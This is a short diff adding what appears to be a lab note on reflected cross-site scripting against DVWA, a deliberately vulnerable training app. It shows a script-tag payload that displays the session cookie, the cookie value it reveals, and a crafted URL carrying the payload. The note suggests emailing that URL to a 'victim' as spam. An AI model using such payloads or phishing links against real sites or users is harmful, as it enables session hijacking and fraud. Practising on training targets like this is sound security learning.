@@ -1,0 +1,12 @@
+Just type in the form:
+
+<script>alert(document.cookie)</script>
+
+This will prompt a box containing this informations:
+
+security=low; PHPSESSID=9cadd175e79f72e3bbe1ff97fc0b850e
+
+Just copy the URL of the page so we can send it via a spam email to the victim
+
+10.10.15.4/dvwa/vulnerabilites/xss_r/?name=<script>alert(document.cookie)<%2Fscript>#
+
